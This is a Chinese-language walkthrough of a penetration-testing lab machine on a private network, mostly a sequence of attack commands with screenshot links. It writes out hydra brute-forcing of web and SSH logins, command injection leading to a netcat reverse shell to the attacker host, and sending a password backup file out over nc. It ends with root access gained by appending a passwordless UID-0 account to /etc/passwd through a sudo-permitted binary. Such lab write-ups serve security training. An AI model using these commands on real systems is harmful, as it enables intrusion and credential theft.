# 端口发现
nmap -sP 192.168.31.0/24
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668301152042-de39186f-f1d8-45d9-ba27-6123c5179b0f.png#averageHue=%23272c39&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=364&id=ue2c35a3c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=364&originWidth=1043&originalType=binary&ratio=1&rotation=0&showTitle=false&size=114822&status=done&style=none&taskId=u9063c31a-5184-4c0e-8f0c-14c01e7d407&title=&width=1043)
nmap -p- -A 192.168.31.145
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668301141369-48a504e3-e2f2-4cc9-a69c-bdf93e9206ab.png#averageHue=%23272c38&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=415&id=u94223bda&margin=%5Bobject%20Object%5D&name=image.png&originHeight=415&originWidth=1127&originalType=binary&ratio=1&rotation=0&showTitle=false&size=132801&status=done&style=none&taskId=uaaf28c8c-6111-4f26-b43d-40fd98aabb7&title=&width=1127)
# web 突破
访问 80 端口，是个登录框，写着管理员信息系统登录
再无其他信息，只能爆破
hydra -L 1.txt -P 1.txt 192.168.31.145 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -F
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668301721038-d8d022a8-e0b3-433f-82ff-6289137aff15.png#averageHue=%2329313e&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=241&id=u56fc0bc0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=241&originWidth=1219&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100288&status=done&style=none&taskId=u6bc1affb-aad8-441d-a69f-8f8a857ba4d&title=&width=1219)
爆破得出  admin :  happy
登录管理员，登进去好像可以使用命令
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668301799734-c1fd7908-4309-48d8-8752-44c9f6eb7984.png#averageHue=%23d2d2ca&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=352&id=uc6d149e6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=352&originWidth=1919&originalType=binary&ratio=1&rotation=0&showTitle=false&size=133784&status=done&style=none&taskId=uaa0c1de3-5aed-4411-8a63-4633845571f&title=&width=1919)
但是好像只能执行固定的命令，抓包改包
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668301909736-64c5d0f2-fbde-4960-85f5-a13933b8e5ed.png#averageHue=%23f6f5f5&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=342&id=u60b33c36&margin=%5Bobject%20Object%5D&name=image.png&originHeight=342&originWidth=1281&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60017&status=done&style=none&taskId=u356db189-8944-45bd-af1b-4093158309a&title=&width=1281)
改成 cat login.php
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668301967642-26c146d1-85b3-4f48-9516-5e5082afcd84.png#averageHue=%23faf9f9&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=694&id=ubb55a37a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=694&originWidth=1279&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75165&status=done&style=none&taskId=ud129c865-5e16-4c11-b458-f8dd70a7d8c&title=&width=1279)
能看，确定有 RCE
kali 监听端口，准备反弹 shell
nc 192.168.31.128 4444 -e /bin/bash
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668302049406-9aa29631-4942-40b4-9b2d-aaa003e14f8a.png#averageHue=%23f7f5f5&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=95&id=u7bbfa358&margin=%5Bobject%20Object%5D&name=image.png&originHeight=95&originWidth=490&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8352&status=done&style=none&taskId=u3ffca6cf-c58c-4d3d-b710-1a57cf619da&title=&width=490)
成功连上反弹 shell
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668302112841-9159e9e4-e765-4a91-9fe9-2ca0391ab1ce.png#averageHue=%23262d39&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=175&id=u08f74c9d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=175&originWidth=1071&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37093&status=done&style=none&taskId=u044c3df4-35ea-4411-82bc-ff5db20b7c6&title=&width=1071)
python 优化 shell
python -c 'import pty;pty.spawn("/bin/bash")'
进入 home 目录，发现有三个用户，在 jim 的目录下发现 /home/jim/backups 下面有个 old-passwords.bak
用给的旧密码本去爆破 jim 的密码
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668302217645-16248d88-c0ac-4bd2-93e1-ac1898c570f9.png#averageHue=%23252b36&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=400&id=u77b529b3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=400&originWidth=1237&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88326&status=done&style=none&taskId=ue212fb50-0299-4165-abc9-6a561c884a8&title=&width=1237)
使用 nc 将old-passwords.bak 传到 kali
kali：nc -lvvp 5555 > ./2.txt
靶机：nc 192.168.31.128 5555 < /home/jim/backups/old-passwords.bak
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668302621516-76376867-b675-4d8d-a585-6a625f089635.png#averageHue=%23283648&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=393&id=ue8d491e1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=393&originWidth=1104&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95114&status=done&style=none&taskId=uebd9511c-ae39-4c08-a930-3d2cddc56db&title=&width=1104)
已经传过来了
开始用 jim 和密码本对 ssh 进行爆破
hydra -l jim -P ./2.txt -f 192.168.31.145 ssh -t 4
_-l 指定用户名   -f 匹配到正确的就停止   -t 4  ssh 爆破被限速，推荐 t 4_
爆破完是 jim:jibril04
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668303153445-5c441a74-9f47-42e0-99d4-776e2a8e878e.png#averageHue=%23272f3c&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=399&id=uf59afcae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=399&originWidth=1141&originalType=binary&ratio=1&rotation=0&showTitle=false&size=123564&status=done&style=none&taskId=u4791e94b-bd9d-4e91-b210-5b9c32cce5b&title=&width=1141)
find / -name jim，找到 /var/mail/jim
cat /var/mail/jim
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668303326073-b507a114-144c-483d-b97a-fc7cbd342d95.png#averageHue=%23273140&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=455&id=ucc1c39b7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=455&originWidth=1362&originalType=binary&ratio=1&rotation=0&showTitle=false&size=125847&status=done&style=none&taskId=u5e1963f7-0b8d-4b9a-9e37-75aec47b546&title=&width=1362)
尝试之后发现是 charles 的密码
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668303407833-80d96cd4-7f33-479f-895e-8c4b36f318a1.png#averageHue=%23242e3b&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=177&id=udf06ab05&margin=%5Bobject%20Object%5D&name=image.png&originHeight=177&originWidth=743&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24050&status=done&style=none&taskId=ua4d6594d-b09b-48e3-b783-27eeba7453b&title=&width=743)
查看权限  sudo -l
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668303432642-ff38f541-a0e0-4f2e-9c24-c23598570a29.png#averageHue=%23273341&clientId=u71a6ca6f-056d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=144&id=u79b7d536&margin=%5Bobject%20Object%5D&name=image.png&originHeight=144&originWidth=1017&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32910&status=done&style=none&taskId=u4914b781-f725-4ac8-98e4-963b89e3dc9&title=&width=1017)
发现可以免密使用 /usr/bin/teehee
# 提权
利用 teehee 命令对 /etc/passwd 中写入一个 admin 用户，
echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
_/etc/passwd 的格式如下_

- _ 用户名：密码：UID (用户ID) : GID (组ID) : 描述性信息：主目录：默认Shell _

写入的 admin 用户无密码，UID 和 GID 都是 0 ，相当于 root
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668303804082-9cbd381f-d07c-4a50-8912-9e2b954b2518.png#averageHue=%23273949&clientId=u8d6b6df6-1654-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=95&id=u14cded5b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=95&originWidth=816&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22489&status=done&style=none&taskId=uab0fd6ea-28b2-4706-bd33-5171b02327b&title=&width=816)
提权成功
拿 flag
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668303851644-ad1fedd2-37a3-4bf5-b5da-675244d7d615.png#averageHue=%23262d39&clientId=u8d6b6df6-1654-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=484&id=u03403283&margin=%5Bobject%20Object%5D&name=image.png&originHeight=484&originWidth=1201&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89272&status=done&style=none&taskId=ua43b792a-c7f2-4370-a870-59c5f2d42da&title=&width=1201)

